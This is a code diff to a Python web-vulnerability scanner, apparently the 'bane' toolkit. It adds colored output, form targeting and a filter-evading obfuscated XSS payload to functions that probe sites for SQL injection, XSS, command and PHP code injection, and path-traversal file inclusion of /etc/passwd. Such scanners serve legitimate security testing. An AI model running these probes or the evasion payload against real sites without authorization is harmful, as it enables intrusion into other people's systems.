@@ -1,12 +1,26 @@
 #coding: utf-8
-import subprocess,os,xtelnet
+import subprocess,os,xtelnet,sys,cgi
+from colorama import Fore, Back, Style
+if  sys.version_info < (3,0):
+ if (sys.platform.lower() == "win32") or( sys.platform.lower() == "win64"):
+  Fore.WHITE=''
+  Fore.GREEN=''
+  Fore.RED=''
+  Fore.YELLOW=''
+  Fore.BLUE=''
+  Fore.MAGENTA=''
+  Style.RESET_ALL=''
+ import urllib,HTMLParser
+else:
+ import urllib.parse as urllib
+ import html.parser as HTMLParser
 import requests,socket,random,time,ssl
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import bs4
 from bs4 import BeautifulSoup
 from bane.payloads import *
-from bane.pager import inputs,forms
+from bane.pager import inputs,forms,crawl
 def sqli_error_based(u,logs=True,user_agent=None,returning=False,timeout=10,proxy=None,cookie=None):
  '''
    this function is to test a given link to check it the target is vulnerable to SQL Injection or not by adding "'" at the end of the line and
@@ -43,7 +57,7 @@ def sqli_error_based(u,logs=True,user_agent=None,returning=False,timeout=10,prox
  else:
    hea={'User-Agent': us}
  if logs==True:
-  print("[*]Error Based SQL Injection test")
+  print(Fore.WHITE+"[*]Error Based SQL Injection test"+Style.RESET_ALL)
  try:
   u+="'"
   rp= requests.get(u,headers = hea,proxies=proxy,timeout=timeout,verify=False).text
@@ -54,9 +68,9 @@ def sqli_error_based(u,logs=True,user_agent=None,returning=False,timeout=10,prox
   pass
  if logs==True:
   if s==False:
-   print("[-]Not vulnerable")
+   print(Fore.RED+"[-]Not vulnerable"+Style.RESET_ALL)
   if s==True:
-   print("[+]Vulnerable!!!")
+   print(Fore.GREEN+"[+]Vulnerable!!!"+Style.RESET_ALL)
  if returning==True:
   return s
 def sqli_boolean_based(u,logs=True,returning=False,timeout=10,proxy=None,user_agent=None,cookie=None):
@@ -96,7 +110,7 @@ def sqli_boolean_based(u,logs=True,returning=False,timeout=10,proxy=None,user_ag
    hea={'User-Agent': us}
  try:
   if logs==True:
-   print("[*]Boolean Based SQL Injection test")
+   print(Fore.WHITE+"[*]Boolean Based SQL Injection test"+Style.RESET_ALL)
   r=requests.get(u+" and 1=2",headers=hea,proxies=proxy,timeout=timeout, verify=False)
   q=requests.get(u+" and 1=1",headers=hea,proxies=proxy,timeout=timeout, verify=False)
   r1=r.text
@@ -108,9 +122,9 @@ def sqli_boolean_based(u,logs=True,returning=False,timeout=10,proxy=None,user_ag
   pass
  if logs==True:
   if s==False:
-   print("[-]Not vulnerable")
+   print(Fore.RED+"[-]Not vulnerable"+Style.RESET_ALL)
   if s==True:
-   print("[+]Vulnerable!!!")
+   print(Fore.GREEN+"[+]Vulnerable!!!"+Style.RESET_ALL)
  if returning==True:
   return s
 def sqli_time_based(u,delay=15,db="mysql",logs=True,returning=False,timeout=25,proxy=None,user_agent=None,cookie=None):
@@ -159,7 +173,7 @@ def sqli_time_based(u,delay=15,db="mysql",logs=True,returning=False,timeout=25,p
   return None
  try:
   if logs==True:
-   print("[*]Time Based SQL Injection test")
+   print(Fore.WHITE+"[*]Time Based SQL Injection test"+Style.RESET_ALL)
   t=time.time()
   r=requests.get(u+sle,headers=hea,proxies=proxy,timeout=timeout, verify=False)
   if ((time.time()-t>=delay)and (r.status_code==200)):
@@ -168,11 +182,15 @@ def sqli_time_based(u,delay=15,db="mysql",logs=True,returning=False,timeout=25,p
   pass
  if logs==True:
   if s==False:
-   print("[-]Not vulnerable")
+   print(Fore.RED+"[-]Not vulnerable"+Style.RESET_ALL)
   if s==True:
-   print("[+]Vulnerable!!!")
+   print(Fore.GREEN+"[+]Vulnerable!!!"+Style.RESET_ALL)
  if returning==True:
   return s
+def xss_html_decode(payload,html_encode_level=0):
+ for x in range(html_encode_level):
+  payload=HTMLParser.HTMLParser().unescape(payload)
+ return payload
 def xss_get(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None,debug=False,fill_empty=0):
   '''
    this function is for xss test with GET requests.
@@ -208,10 +226,8 @@ def xss_get(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None,de
      st+=random.choice(lis)
     d[i]=st
   if debug==True:
-   print("\n")
    for x in d:
-    print("{} : {}".format(x,d[x]))
-   print("\n")
+    print("{}{} : {}{}".format(Fore.MAGENTA,x,Fore.WHITE,d[x]))
   try:
      c=requests.get(u, params= pl,headers = hea,proxies=proxy,timeout=timeout, verify=False).text
      if  xp in c:
@@ -254,18 +270,16 @@ def xss_post(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None,d
      st+=random.choice(lis)
     d[i]=st
   if debug==True:
-   print("\n")
    for x in d:
-    print("{} : {}".format(x,d[x]))
-   print("\n")
+    print("{}{} : {}{}".format(Fore.MAGENTA,x,Fore.WHITE,d[x]))
   try:
      c=requests.post(u, data= d,headers = hea,proxies=proxy,timeout=timeout, verify=False).text
      if xp in c:
       return True 
   except Exception as e:
-   pass
+   print(e)
   return False
-def xss(u,payload=None,ignore_values=False,fresh=True,logs=True,fill_empty=10,returning=False,proxy=None,ignore_in_value=["..."],proxies=None,timeout=10,user_agent=None,cookie=None,debug=False):
+def xss(u,payload=None,target_form_action=None,ignore_values=False,fresh=True,logs=True,fill_empty=10,returning=False,proxy=None,ignore_in_value=["..."],proxies=None,timeout=10,user_agent=None,cookie=None,debug=False):
   '''
    this function is for xss test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.
 
@@ -285,6 +299,7 @@ def xss(u,payload=None,ignore_values=False,fresh=True,logs=True,fill_empty=10,re
    
   '''
   global stop
+  target_page=u
   stop=False
   if proxy:
    proxy=proxy
@@ -294,20 +309,31 @@ def xss(u,payload=None,ignore_values=False,fresh=True,logs=True,fill_empty=10,re
   if payload:
    xp=payload
   else:
-   xp='<script>alert("Vulnerable!!!");</script>'
+   xp='<sCrIpT GHUHhhJK>/*ala*/'+random.choice(["top","self","window","parent"])+'/*ala*/[/*ala*/'+random.choice(['`a`+/*ala*/`l`/*ala*/+`e`/*ala*/+`r`/*ala*/+`t`','`c`+/*ala*/`o`/*ala*/+`n`/*ala*/+`f`/*ala*/+`i`/*ala*/+`r`/*ala*/+`m`','`p`/*ala*/+`r`/*ala*/+`o`/*ala*/+`m`/*ala*/+`p`/*ala*/+`t`'])+'/*ala*/]/*ala*/`vulnerable`/*ala*/</ScRiPt FjhGH>'
   if logs==True:
-   print("Getting forms...")
+   print(Fore.WHITE+"[~]Getting forms..."+Style.RESET_ALL)
   hu=True
   fom=forms(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent)
   if len(fom)==0:
    if logs==True:
-    print("No forms were found!!!")
+    print(Fore.RED+"[-]No forms were found!!!"+Style.RESET_ALL)
    hu=False
   if hu==True:
+   if target_form_action:
+    i=0
+    for x in fom:
+     if x["action"]==target_form_action:
+       i=fom.index(x)
+    fom=fom[i:i+1]
    form_index=-1
    for l1 in fom:
-    form_index+=1
-    lst=[]
+    if target_form_action:
+     form_index=0
+    else:
+     form_index+=1
+    lst={}
+    vul=[]
+    sec=[]
     u=l1['action']
     if l1['method']=='post':
      post=True
@@ -315,8 +341,11 @@ def xss(u,payload=None,ignore_values=False,fresh=True,logs=True,fill_empty=10,re
     else:
      post=False
      get=True
+    if logs==True:
+      print(Fore.BLUE+"Form: "+Fore.WHITE+str(form_index)+Fore.BLUE+"\nAction: "+Fore.WHITE+u+Fore.BLUE+"\nMethod: "+Fore.WHITE+l1['method']+Fore.BLUE+"\nPayload: "+Fore.WHITE+xp+Style.RESET_ALL)
     if len(inputs(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent))==0:
-     print("[-]No parameters found !! Moving on..")
+     if logs==True:
+      print(Fore.YELLOW+"[-]No parameters found on that page !! Moving on.."+Style.RESET_ALL)
     else:
      extr=[]
      l=[]
@@ -328,8 +357,6 @@ def xss(u,payload=None,ignore_values=False,fresh=True,logs=True,fill_empty=10,re
      for x in extr:
       if x.split(':')[0] in l:
        extr.remove(x)
-     if logs==True:
-      print("\n\nURL: "+u+"\nPayload: "+xp+"\n")
      #if '?' in u:
       #u=u.split('?')[0]
      for i in l:
@@ -354,6 +381,12 @@ def xss(u,payload=None,ignore_values=False,fresh=True,logs=True,fill_empty=10,re
          extr=[]
          user=random.choice(ua)
          k=forms(u,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
+         if target_form_action:
+          j=0
+          for x in k:
+           if x["action"]==target_form_action:
+            j=k.index(x)
+          k=k[j:j+1]
          for x in k[form_index]['inputs']:
           if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in ignore_in_value))):
            extr.append(x)
@@ -375,12 +408,15 @@ def xss(u,payload=None,ignore_values=False,fresh=True,logs=True,fill_empty=10,re
          for x in extra:
           extra[x]=""
         if xss_get(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie,debug=debug,fill_empty=fill_empty)==True:
-          x="parameter: '"+i+"' method: 'GET' => [+]Payload was found"
+          x="parameter: '"+i+"' => [+]Payload was found"
+          vul.append(i)
+          colr=Fore.GREEN
         else:
-         x="parameter: '"+i+"' method: 'GET' => [-]Payload was not found"
-        lst.append(x)
+         x="parameter: '"+i+"' => [-]Payload was not found"
+         sec.append(i)
+         colr=Fore.RED
         if logs==True:
-         print (x)
+         print (colr+x+Style.RESET_ALL)
        if post==True:
         if fresh==True:
          if stop==True:
@@ -388,6 +424,12 @@ def xss(u,payload=None,ignore_values=False,fresh=True,logs=True,fill_empty=10,re
          extr=[]
          user=random.choice(ua)
          k=forms(u,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
+         if target_form_action:
+          j=0
+          for x in k:
+           if x["action"]==target_form_action:
+            j=k.index(x)
+          k=k[j:j+1]
          for x in k[form_index]['inputs']:
           if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in ignore_in_value))):
            extr.append(x)
@@ -409,18 +451,23 @@ def xss(u,payload=None,ignore_values=False,fresh=True,logs=True,fill_empty=10,re
          for x in extra:
           extra[x]=""
         if xss_post(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie,debug=debug,fill_empty=fill_empty)==True:
-        	x="parameter: '"+i+"' method: 'POST' => [+]Payload was found"
+         x="parameter: '"+i+"' => [+]Payload was found"
+         vul.append(i)
+         colr=Fore.GREEN
         else:
-         x="parameter: '"+i+"' method: 'POST' =>  [-]Payload was not found"
-        lst.append(x)
+         x="parameter: '"+i+"' =>  [-]Payload was not found"
+         sec.append(i)
+         colr=Fore.RED
+        #lst.update(reslt)
         if logs==True:
-         print (x)
-      except:
+         print (colr+x+Style.RESET_ALL)
+      except Exception as ex:
+       print(ex)
        break
-    dic.update({u:lst}) 
+    dic.update({form_index:{"Form":u,"Method":l1['method'],"Passed":vul,"Failed":sec}}) 
    if returning==True:
-    return dic
-def command_exec_link(u,timeout=10,proxy=None,logs=True,returning=False,user_agent=None,cookie=None):
+    return {"Payload":xp,"Page":target_page,"Results":dic}
+def command_exec_link(u,timeout=10,proxy=None,user_agent=None,cookie=None):
  '''
    this function is for command execution test using a given link
 '''
@@ -443,13 +490,7 @@ def command_exec_link(u,timeout=10,proxy=None,logs=True,returning=False,user_age
     s=True
  except:
   pass
- if logs==True:
-  if s==True:
-   print("[+]Vulnerable!!!")
-  else:
-   print("[-]Not vulnerable")
- if returning==True:
-  return s
+ return s
 def command_exec_get(u,param='',value='',extra=None,timeout=10,proxy=None,user_agent=None,cookie=None):
  '''
   this function is for command execution test using a given link and GET parameter
@@ -558,13 +599,7 @@ def php_code_inject_link(u,closed=True,end=False,timeout=10,proxy=None,logs=True
     s= True
  except:
   pass
- if logs==True:
-  if s==True:
-   print("[+]Vulnerable!!!")
-  else:
-   print("[-]Not vulnerable")
- if returning==True:
-  return s
+ return s
 def php_code_inject_post(u,param='',value='',extra=None,end=False,timeout=10,proxy=None,user_agent=None,cookie=None):
  '''
   this function is for PHP code execution test using a given link and POST parameter
@@ -628,23 +663,23 @@ def file_inclusion(u,nullbyte=False,rounds=10,logs=True,returning=False,mapping=
     proxy={'http':'http://'+random.choice(proxies)}
    try:
     if logs==True:
-     print("[*]Trying: "+ u+l)
+     print(Fore.WHITE+"[*]Trying: "+ u+l+Style.RESET_ALL)
     r=requests.get(u+l,headers=hea,proxies=proxy,timeout=timeout, verify=False)
     if ("root:x:0:0:" in r.text):
      s=True
      x= {"Status":s,"../ added": i,"Nullbyte":nullbyte,'Link':r.url}
      if logs==True:
-      print("[+]FOUND!!!")
+      print(Fore.GREEN+"[+]FOUND!!!"+Style.RESET_ALL)
      break
     elif (r.status_code!=200):
      x= {"Status":s,"Reason":"protected"}
      if logs==True:
-      print("[-]Status Code:',r.status_code,',something is wrong...")
+      print(Fore.RED+"[-]Status Code:',r.status_code,',something is wrong..."+Style.RESET_ALL)
      break
     else:
      l='../'+l
      if logs==True:
-      print("[-]Failed")
+      print(Fore.RED+"[-]Failed"+Style.RESET_ALL)
    except Exception as e:
     pass
  else:
@@ -653,23 +688,23 @@ def file_inclusion(u,nullbyte=False,rounds=10,logs=True,returning=False,mapping=
    l+='%00'
   try:
     if logs==True:
-     print("[*]Trying: "+u+l)
+     print(Fore.WHITE+"[*]Trying: "+u+l+Style.RESET_ALL)
     r=requests.get(u+l,headers=hea,proxies=proxy,timeout=timeout, verify=False)
     if ("root:x:0:0:" in r.text):
      s=True
      x= {"Status":s,"Nullbyte":nullbyte,'Link':r.url}
      if logs==True:
-      print("[+]FOUND!!!")
+      print(Fore.GREEN+"[+]FOUND!!!"+Style.RESET_ALL)
     elif (r.status_code!=200):
      x= {"Status":s,"Reason":"protected"}
      if logs==True:
-      print("[-]Status Code:',r.status_code,',something went wrong...")
+      print(Fore.RED+"[-]Status Code: "+str(r.status_code)+",something went wrong..."+Style.RESET_ALL)
     else:
      if logs==True:
-      print("[-]Failed")
+      print(Fore.RED+"[-]Failed"+Style.RESET_ALL)
   except Exception as e:
     if logs==True:
-     print("[-]Error Failure")
+     print(Fore.RED+"[-]Error Failure"+Style.RESET_ALL)
  if s==False:
   x= {"Status":s,"Reason":"not vulnerable"}
  if returning==True:
